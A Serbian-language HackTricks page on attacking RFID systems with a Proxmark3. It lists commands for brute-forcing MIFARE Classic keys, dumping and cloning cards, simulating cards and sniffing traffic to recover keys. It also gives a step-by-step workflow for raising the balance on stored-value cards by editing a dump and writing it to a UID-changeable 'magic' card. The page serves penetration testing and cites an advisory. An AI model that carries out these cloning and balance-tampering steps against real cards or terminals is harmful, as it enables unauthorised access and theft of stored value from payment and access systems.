# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Napad na RFID sisteme pomoću Proxmark3

Instalirajte aktivno održavani RRG/Iceman Proxmark3 klijent i odgovarajući firmware, a zatim proverite sintaksu komandi za tu verziju jer su starije komande prikazane ispod možda izmenjene.<sup>[[1]](#references)[[5]](#references)</sup>

### Napad na MIFARE Classic 1KB

MIFARE Classic 1K ima **16 sektora**, svaki sa po **4 bloka** od **16 bajtova**. Blok proizvođača 0 sadrži UID/podatke proizvođača i na originalnim NXP karticama je samo za čitanje; posebne kopije ili „magic“ kartice mogu dozvoljavati njegovo prepisivanje.<sup>[[1]](#references)[[2]](#references)</sup>\
Za pristup svakom sektoru potrebna su vam **2 ključa** (**A** i **B**), koji se čuvaju u **bloku 3 svakog sektora** (sektorskom traileru). Sektorski trailer čuva i **pristupne bitove** koji određuju dozvole za **čitanje i pisanje** u **svakom bloku** pomoću ta 2 ključa.\
Na primer, 2 ključa su korisna za dodelu dozvole za čitanje ako znate prvi ključ, a dozvole za pisanje ako znate drugi.

Može se izvesti nekoliko napada.

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 omogućava i druge radnje, poput **prisluškivanja** **komunikacije od taga do čitača**, kako bi se pokušali otkriti osetljivi podaci. Na ovoj kartici možete samo da presretnete komunikaciju i izračunate korišćeni ključ, jer su **korišćene kriptografske operacije slabe**; kada znate otvoreni i šifrovani tekst, možete da izračunate ključ (alatka `mfkey64`).<sup>[[3]](#references)</sup>

#### Brzi radni tok za zloupotrebu sačuvane vrednosti na MiFare Classic karticama

Kada terminali čuvaju stanje na Classic karticama, tipičan tok od početka do kraja je:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Beleške

- `hf mf autopwn` orkestrira napade tipa nested/darkside/HardNested, oporavlja ključeve i kreira dumpove u fascikli za dumpove klijenta.<sup>[[1]](#references)</sup>
- Upisivanje block 0/UID-a funkcioniše samo na magic gen1a/gen2 karticama. UID na običnim Classic karticama je samo za čitanje.<sup>[[2]](#references)</sup>
- U mnogim implementacijama koriste se Classic „value blocks“ ili jednostavne kontrolne sume. Nakon izmene proverite da li su sva duplirana/komplementirana polja i kontrolne sume usklađeni.<sup>[[4]](#references)</sup>

Metodologiju višeg nivoa i mere za ublažavanje rizika pogledajte u:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Sirove komande

IoT sistemi ponekad koriste **nebrendirane ili nekomercijalne tagove**. U tom slučaju možete koristiti Proxmark3 za slanje prilagođenih **sirovih komandi tagovima**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Na osnovu ovih informacija možete pokušati da potražite informacije o kartici i načinu komunikacije s njom. Proxmark3 omogućava slanje sirovih komandi, kao što je: `hf 14a raw -p -b 7 26`

### Skripte

Proxmark3 softver dolazi sa unapred učitanom listom **skripti za automatizaciju** koje možete koristiti za obavljanje jednostavnih zadataka. Da biste dobili celu listu, upotrebite komandu `script list`. Zatim upotrebite komandu `script run`, iza koje sledi naziv skripte:

```
proxmark3> script run mfkeys
```

Možete da napravite skriptu za **fuzz testiranje čitača tagova**: kopirajte podatke sa **validne kartice**, napišite **Lua skriptu** koja **nasumično menja** jedan ili više nasumičnih **bajtova** i proverava da li se **čitač ruši** u nekoj iteraciji.

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic kartice](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP izjava o MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Eksploatacija ranjivosti NFC kartice u sistemu KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — instalacija za Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
